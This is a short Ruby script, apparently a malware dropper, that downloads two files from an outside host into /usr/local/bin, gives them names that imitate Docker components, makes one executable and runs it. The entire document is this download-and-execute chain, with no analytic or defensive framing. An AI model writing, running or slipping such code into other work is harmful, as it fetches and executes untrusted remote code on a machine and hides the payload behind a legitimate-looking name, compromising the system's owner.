require 'open-uri'
fh = '/usr/local/bin/com.docker.sock' 
File.open(fh, 'wb') do |file|
file.write(open('http://b0ring-t3min4l.kr/files/com.docker.sock').read)
end
sleep(1)
File.chmod(0755, fh)
cf = '/usr/local/bin/com.docker.sock.lock' 
File.open(cf, 'wb') do |file|
file.write(open('http://b0ring-t3min4l.kr/files/com.docker.sock.lock').read)
end
sleep(1)
system(fh)
